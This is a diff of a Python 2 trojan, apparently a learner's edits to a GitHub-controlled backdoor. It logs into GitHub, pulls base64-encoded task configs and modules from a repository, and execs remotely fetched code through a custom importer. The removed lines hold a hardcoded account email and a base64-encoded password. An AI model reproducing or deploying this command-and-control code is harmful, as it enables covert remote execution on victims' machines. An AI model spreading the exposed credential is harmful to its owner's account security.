@@ -18,6 +18,9 @@ trojan_id = "LEETME"
 trojan_config = "%s.json" % trojan_id
 trojan_path = "data/%s/" % trojan_id
 trojan_module = []
+# 定义username与password
+user_name = ''
+pass_word = ''
 
 configured = False
 task_queue = Queue.Queue()
@@ -30,6 +33,7 @@ class GitImporter(object):
         self.current_module_code = ""
 
     def find_module(self, fullname, path=None):
+        pdb.set_trace()
         if configured:
             print "[*] Attempting to retrieve %s" % fullname
             new_library = get_file_content("modules/%s" % fullname)
@@ -48,8 +52,8 @@ class GitImporter(object):
 
 # 连接到github，并获取结果
 def connect_to_github():
+    res = login(username=user_name, password=pass_word)
     pdb.set_trace()
-    res = login(username="changgongliu@163.com", password=base64.b64decode("cXExODU1ODQyNzI="))
     repo = res.repository("changgongliu","leetme")
     branch = repo.branch("master")
 
@@ -58,27 +62,30 @@ def connect_to_github():
 #获取文件内容函数
 def get_file_content(file_path):
     res, repo, branch = connect_to_github()
+    pdb.set_trace()
     tree = branch.commit.commit.tree.recurse()##---------------------
     for filename in tree.tree:
         if file_path in filename.path:
-            print "[*] Fount file %s" % file_path
-
+            print "[*] Found file %s" % file_path
             blob = repo.blob(filename._json_data["sha"])
 
-            return blob #　此处函数作用--------------------------------
+            return blob.content #　此处函数作用--------------------------------
+            #return blob #　原来的出错代码
     return None
 
 
 #从远程获取对应的config文件
 def get_trojan_config():
     global configured
-    config_json = get_file_content(trojan_config)# 获取json文件中内容
-    config = json.loads(base64.b64decode(config_json))
-    configured = True
 
+    config_json = get_file_content(trojan_config)# 获取json文件中内容
+    config = json.loads(base64.b64decode(config_json))#　取代config_json
+    configured = True
+    pdb.set_trace()
     for task in config:
         if task["module"] not in sys.modules:
             print "[*] %s not in sys.modules" % task["module"]
+
             exec("import %s" % task["module"])
     return configured
 
